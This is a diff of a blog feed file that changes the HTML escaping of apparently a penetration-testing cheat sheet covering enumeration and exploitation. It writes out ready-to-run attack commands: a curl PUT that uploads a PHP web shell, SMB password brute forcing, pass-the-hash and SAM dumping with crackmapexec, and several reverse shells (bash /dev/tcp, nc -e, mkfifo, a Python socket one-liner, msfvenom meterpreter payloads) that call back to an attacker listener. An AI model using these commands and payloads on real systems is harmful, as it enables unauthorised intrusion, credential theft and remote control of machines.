-<h2 id="methods-allowed">Methods allowed</h2>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-v</span> <span class="nt">-X</span> OPTIONS http://172.16.1.10/ <span class="c"># Will show all methods</span>
-</code></pre></div></div>
+&lt;h2 id=&quot;methods-allowed&quot;&gt;Methods allowed&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; OPTIONS http://172.16.1.10/ &lt;span class=&quot;c&quot;&gt;# Will show all methods&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<p>Put method</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-v</span> <span class="nt">-X</span> PUT <span class="nt">-d</span> <span class="s2">"&lt;?php system(</span><span class="se">\$</span><span class="s2">_GET["</span>cmd<span class="s2">"]); ?&gt;"</span> http://172.16.1.10/webdav/shell.php
-</code></pre></div></div>
+&lt;p&gt;Put method&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; PUT &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;?php system(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;_GET[&quot;&lt;/span&gt;cmd&lt;span class=&quot;s2&quot;&gt;&quot;]); ?&amp;gt;&quot;&lt;/span&gt; http://172.16.1.10/webdav/shell.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h2 id="ftp">FTP</h2>
-<p>Commons credentials:</p>
-<ul>
-  <li>User:anonymous, pass:anonymous</li>
-</ul>
+&lt;h2 id=&quot;ftp&quot;&gt;FTP&lt;/h2&gt;
+&lt;p&gt;Commons credentials:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;User:anonymous, pass:anonymous&lt;/li&gt;
+&lt;/ul&gt;
 
-<h2 id="smb">SMB</h2>
-<p>Permit share directories and files. Port 139 -&gt; NetBIOS, port 445 -&gt; SMB over TCP
-Links:</p>
-<ul>
-  <li><a href="https://book.hacktricks.xyz/pentesting/pentesting-smb">Hacktricks SMB</a></li>
-</ul>
+&lt;h2 id=&quot;smb&quot;&gt;SMB&lt;/h2&gt;
+&lt;p&gt;Permit share directories and files. Port 139 -&amp;gt; NetBIOS, port 445 -&amp;gt; SMB over TCP
+Links:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://book.hacktricks.xyz/pentesting/pentesting-smb&quot;&gt;Hacktricks SMB&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
 
-<h3 id="windows">Windows</h3>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nbtstat <span class="nt">-A</span> 172.16.1.4 <span class="c"># show name, group, etc...</span>
+&lt;h3 id=&quot;windows&quot;&gt;Windows&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nbtstat &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; 172.16.1.4 &lt;span class=&quot;c&quot;&gt;# show name, group, etc...&lt;/span&gt;
 
-net view <span class="se">\\</span>172.16.1.5 <span class="c"># Try to connect</span>
+net view &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;172.16.1.5 &lt;span class=&quot;c&quot;&gt;# Try to connect&lt;/span&gt;
 
-net view <span class="se">\\</span>172.16.1.5 <span class="s2">""</span> u:<span class="s2">""</span> <span class="c"># Null session logon</span>
+net view &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;172.16.1.5 &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; u:&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Null session logon&lt;/span&gt;
 
-net use h: <span class="se">\\</span>172.16.1.5<span class="se">\o</span>pt <span class="c"># Mount the folder in h:</span>
+net use h: &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;172.16.1.5&lt;span class=&quot;se&quot;&gt;\o&lt;/span&gt;pt &lt;span class=&quot;c&quot;&gt;# Mount the folder in h:&lt;/span&gt;
 
-nbtstat <span class="nt">-c</span> <span class="c"># Cache of all old connections</span>
-</code></pre></div></div>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#Python brute force
-</span><span class="k">for</span> <span class="o">/</span><span class="n">f</span> <span class="o">%</span><span class="n">i</span> <span class="ow">in</span> <span class="p">(</span><span class="n">passwords</span><span class="p">.</span><span class="n">txt</span><span class="p">)</span> <span class="n">do</span> <span class="n">net</span> <span class="n">use</span> \\<span class="mf">172.16</span><span class="p">.</span><span class="mf">1.4</span> <span class="o">%</span><span class="n">i</span> <span class="o">/</span><span class="n">u</span><span class="p">:</span><span class="n">john</span>
-</code></pre></div></div>
+nbtstat &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Cache of all old connections&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#Python brute force
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passwords&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;txt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;net&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;use&lt;/span&gt; \\&lt;span class=&quot;mf&quot;&gt;172.16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;john&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h3 id="linux">Linux</h3>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nbtscan <span class="nt">-r</span> 172.16.1.0/24 <span class="c"># Search in range</span>
+&lt;h3 id=&quot;linux&quot;&gt;Linux&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nbtscan &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 172.16.1.0/24 &lt;span class=&quot;c&quot;&gt;# Search in range&lt;/span&gt;
 
-smbclient  <span class="nt">-L</span> <span class="se">\\</span>172.16.1.5 <span class="nt">-N</span> <span class="c"># Connect in anonymous mode</span>
+smbclient  &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;172.16.1.5 &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Connect in anonymous mode&lt;/span&gt;
 
-smbclient   //172.16.1.5/_DOCS <span class="nt">-N</span> <span class="c"># Connect in a directory</span>
+smbclient   //172.16.1.5/_DOCS &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Connect in a directory&lt;/span&gt;
 
-smbclient  <span class="nt">-L</span> <span class="se">\\</span>172.16.1.5 <span class="nt">-N</span> —option<span class="o">=</span><span class="s1">'client min protocol=NT1'</span> <span class="c"># Sometimes can have a version incompatibility with older versions</span>
+smbclient  &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;172.16.1.5 &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; —option&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client min protocol=NT1&apos;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Sometimes can have a version incompatibility with older versions&lt;/span&gt;
 
-crackmapexec smb 192.168.10.11 <span class="nt">-u</span> Administrator <span class="nt">-H</span> &lt;NTHASH&gt; <span class="nt">-x</span> <span class="nb">whoami</span> <span class="c">#Pass-the-Hash</span>
-crackmapexec smb 192.168.10.11 <span class="nt">-u</span> Administrator <span class="nt">-p</span> <span class="s1">'password'</span> <span class="nt">-x</span> <span class="nb">whoami</span> <span class="c">#Execute cmd</span>
-crackmapexec smb &lt;IP&gt; <span class="nt">-d</span> &lt;DOMAIN&gt; <span class="nt">-u</span> Administrator <span class="nt">-p</span> <span class="s1">'password'</span> <span class="nt">--sam</span> <span class="c">#Dump SAM</span>
-</code></pre></div></div>
-<p>Automatic enumeration : <a href="https://github.com/CiscoCXSecurity/enum4linux">enum4linux</a></p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enum4linux <span class="nt">-U</span> 172.16.1.5 <span class="c"># Without users</span>
+crackmapexec smb 192.168.10.11 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; Administrator &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &amp;lt;NTHASH&amp;gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#Pass-the-Hash&lt;/span&gt;
+crackmapexec smb 192.168.10.11 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; Administrator &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;password&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#Execute cmd&lt;/span&gt;
+crackmapexec smb &amp;lt;IP&amp;gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &amp;lt;DOMAIN&amp;gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; Administrator &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;password&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--sam&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#Dump SAM&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Automatic enumeration : &lt;a href=&quot;https://github.com/CiscoCXSecurity/enum4linux&quot;&gt;enum4linux&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;enum4linux &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; 172.16.1.5 &lt;span class=&quot;c&quot;&gt;# Without users&lt;/span&gt;
 
-enum4linux <span class="nt">-a</span> 172.16.1.5 <span class="c"># All</span>
-</code></pre></div></div>
-<h2 id="rpc-remote-proccedure-call">RPC Remote proccedure call</h2>
-<p>API to call commands in another machines.</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span> 172.16.1.5 <span class="c"># Anonymous login</span>
-<span class="c"># After connect</span>
-enumdomusers <span class="c"># Enumerate users</span>
+enum4linux &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; 172.16.1.5 &lt;span class=&quot;c&quot;&gt;# All&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;rpc-remote-proccedure-call&quot;&gt;RPC Remote proccedure call&lt;/h2&gt;
+&lt;p&gt;API to call commands in another machines.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; 172.16.1.5 &lt;span class=&quot;c&quot;&gt;# Anonymous login&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# After connect&lt;/span&gt;
+enumdomusers &lt;span class=&quot;c&quot;&gt;# Enumerate users&lt;/span&gt;
 queryuser jonh
-</code></pre></div></div>
-<h2 id="nfs-network-file-system">NFS Network file system</h2>
-<p>Protocol to share files. Port 2049</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcinfo <span class="nt">-p</span> 172.16.1.5 | <span class="nb">grep </span>nfs <span class="c"># Check versions</span>
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;nfs-network-file-system&quot;&gt;NFS Network file system&lt;/h2&gt;
+&lt;p&gt;Protocol to share files. Port 2049&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rpcinfo &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 172.16.1.5 | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;nfs &lt;span class=&quot;c&quot;&gt;# Check versions&lt;/span&gt;
 
-showmount <span class="nt">-e</span> 172.16.1.5 <span class="c"># Show shared</span>
+showmount &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; 172.16.1.5 &lt;span class=&quot;c&quot;&gt;# Show shared&lt;/span&gt;
 
-mount <span class="nt">-t</span> nfs <span class="nt">-o</span> <span class="nv">nfsverscat</span><span class="o">=</span>2 172.16.1.5:/ /tmp/nfs <span class="c">#Mount the nfs</span>
-</code></pre></div></div>
+mount &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; nfs &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;nfsverscat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2 172.16.1.5:/ /tmp/nfs &lt;span class=&quot;c&quot;&gt;#Mount the nfs&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h2 id="snmp-simple-network-management-protocol">SNMP Simple Network Management protocol</h2>
-<p>Protocol used to monitor different devices in the network (like routers, switches, printers, IoTs…). Ports: 161,162,10161,10162/UDP
-Links:</p>
-<ul>
-  <li><a href="https://book.hacktricks.xyz/pentesting/pentesting-snmp">Hacktricks snmp</a></li>
-  <li><a href="https://www.alvestrand.no/objectid/1.3.6.1.2">objectid list</a></li>
-</ul>
+&lt;h2 id=&quot;snmp-simple-network-management-protocol&quot;&gt;SNMP Simple Network Management protocol&lt;/h2&gt;
+&lt;p&gt;Protocol used to monitor different devices in the network (like routers, switches, printers, IoTs…). Ports: 161,162,10161,10162/UDP
+Links:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://book.hacktricks.xyz/pentesting/pentesting-snmp&quot;&gt;Hacktricks snmp&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.alvestrand.no/objectid/1.3.6.1.2&quot;&gt;objectid list&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>onesixtyone <span class="nt">-c</span> comu.txt 172.16.1.0/24 <span class="c"># Search by open hosts with communities</span>
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;onesixtyone &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; comu.txt 172.16.1.0/24 &lt;span class=&quot;c&quot;&gt;# Search by open hosts with communities&lt;/span&gt;
 
-snmpwalk <span class="nt">-c</span> public <span class="nt">-v1</span> 172.16.1.4 1.3.6.1.4.1.77.1.2.25  <span class="c"># Search with public community and specific code</span>
+snmpwalk &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; public &lt;span class=&quot;nt&quot;&gt;-v1&lt;/span&gt; 172.16.1.4 1.3.6.1.4.1.77.1.2.25  &lt;span class=&quot;c&quot;&gt;# Search with public community and specific code&lt;/span&gt;
 
-snmp-check 172.16.1.4 <span class="nt">-c</span> public <span class="c"># Show info of host</span>
-</code></pre></div></div>
+snmp-check 172.16.1.4 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; public &lt;span class=&quot;c&quot;&gt;# Show info of host&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h2 id="waf-web-application-firewall">WAF Web application firewall</h2>
+&lt;h2 id=&quot;waf-web-application-firewall&quot;&gt;WAF Web application firewall&lt;/h2&gt;
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WAFW00F google.com
-</code></pre></div></div>]]></content><author><name>Thekaiz3n</name></author><category term="guide" /><category term="pentest" /><category term="methodologies" /><category term="recon" /><category term="enumeration" /><summary type="html"><![CDATA[This is a guide for exploitation]]></summary></entry><entry><title type="html">Exploitation</title><link href="http://localhost:4000/guide/2022/01/13/exploitation.html" rel="alternate" type="text/html" title="Exploitation" /><published>2022-01-13T00:00:00-03:00</published><updated>2022-01-13T00:00:00-03:00</updated><id>http://localhost:4000/guide/2022/01/13/exploitation</id><content type="html" xml:base="http://localhost:4000/guide/2022/01/13/exploitation.html"><![CDATA[<h2 id="public-exploits">Public exploits</h2>
-<p>Links:</p>
-<ul>
-  <li><a href="www.exploit-db.com">Exploitdb</a></li>
-  <li><a href="packetstormysecurity.com">packetstormysecurity</a></li>
-  <li><a href="securityfocus.com">securityfocus</a></li>
-  <li><a href="cve.mitre.org/cve/search_cve_list.html">CVE Mitre</a></li>
-</ul>
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;WAFW00F google.com
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Thekaiz3n</name></author><category term="guide" /><category term="pentest" /><category term="methodologies" /><category term="recon" /><category term="enumeration" /><summary type="html">This is a guide for exploitation</summary></entry><entry><title type="html">Exploitation</title><link href="http://localhost:4000/guide/2022/01/13/exploitation.html" rel="alternate" type="text/html" title="Exploitation" /><published>2022-01-13T00:00:00-03:00</published><updated>2022-01-13T00:00:00-03:00</updated><id>http://localhost:4000/guide/2022/01/13/exploitation</id><content type="html" xml:base="http://localhost:4000/guide/2022/01/13/exploitation.html">&lt;h2 id=&quot;public-exploits&quot;&gt;Public exploits&lt;/h2&gt;
+&lt;p&gt;Links:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;www.exploit-db.com&quot;&gt;Exploitdb&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;packetstormysecurity.com&quot;&gt;packetstormysecurity&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;securityfocus.com&quot;&gt;securityfocus&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;cve.mitre.org/cve/search_cve_list.html&quot;&gt;CVE Mitre&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
 
-<h3 id="searchsploit">Searchsploit</h3>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit webmin
-searchsploit webmin —exclude<span class="o">=</span><span class="s2">"php|Dans"</span>
-searchsploit <span class="nt">-e</span> webmin :
-searchsploit ipfire —id <span class="nt">-m</span> 42149 
-</code></pre></div></div>
+&lt;h3 id=&quot;searchsploit&quot;&gt;Searchsploit&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;searchsploit webmin
+searchsploit webmin —exclude&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;php|Dans&quot;&lt;/span&gt;
+searchsploit &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; webmin :
+searchsploit ipfire —id &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 42149 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h3 id="important"><strong>Important!</strong></h3>
-<ul>
-  <li><strong>Always check the payloads.</strong></li>
-  <li>Check the dependencies libs,dll’s…</li>
-  <li>Always test before execute in the target.</li>
-</ul>
+&lt;h3 id=&quot;important&quot;&gt;&lt;strong&gt;Important!&lt;/strong&gt;&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Always check the payloads.&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;Check the dependencies libs,dll’s…&lt;/li&gt;
+  &lt;li&gt;Always test before execute in the target.&lt;/li&gt;
+&lt;/ul&gt;
 
-<h2 id="wordlists">Wordlists</h2>
-<ul>
-  <li><a href="https://github.com/danielmiessler/SecLists">Seclist</a></li>
-  <li><a href="https://wordlists.assetnote.io/">assetnote</a></li>
-</ul>
+&lt;h2 id=&quot;wordlists&quot;&gt;Wordlists&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;Seclist&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://wordlists.assetnote.io/&quot;&gt;assetnote&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
 
-<h2 id="reverse-shell">Reverse shell</h2>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nlvp</span> 4444 <span class="c"># Open port</span>
+&lt;h2 id=&quot;reverse-shell&quot;&gt;Reverse shell&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 4444 &lt;span class=&quot;c&quot;&gt;# Open port&lt;/span&gt;
 
-bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/172.100.50.0/4444 0&gt;&amp;1
-nc <span class="nt">-e</span> /bin/bash 172.100.50.0 4444
+bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/172.100.50.0/4444 0&amp;gt;&amp;amp;1
+nc &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; /bin/bash 172.100.50.0 4444
 /bin/sh | nc 127.0.0.1 5555
-<span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 172.100.50.0 4444 <span class="o">&gt;</span>/tmp/f <span class="c"># OpenBSD</span>
+&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkfifo&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/f|/bin/sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 2&amp;gt;&amp;amp;1|nc 172.100.50.0 4444 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/tmp/f &lt;span class=&quot;c&quot;&gt;# OpenBSD&lt;/span&gt;
 
-python <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.20.1.21",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span> 
+python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.20.1.21&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;&lt;/span&gt; 
 
-msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>172.100.50.0 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-f</span> exe <span class="o">&gt;</span> reverse.exe <span class="c"># Meterpreter</span>
-msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="s2">"172.100.50.0"</span> <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-f</span> asp <span class="o">&gt;</span> shell.asp
-msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="s2">"172.100.50.0"</span> <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-f</span> raw <span class="o">&gt;</span> shell.jsp
-msfvenom <span class="nt">-p</span> php/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>172.100.50.0 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-f</span> raw <span class="nt">-o</span> shell.php
+msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/meterpreter/reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;172.100.50.0 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4444 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; exe &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; reverse.exe &lt;span class=&quot;c&quot;&gt;# Meterpreter&lt;/span&gt;
+msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/meterpreter/reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;172.100.50.0&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4444 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; asp &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shell.asp
+msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; java/jsp_shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;172.100.50.0&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4444 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; raw &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shell.jsp
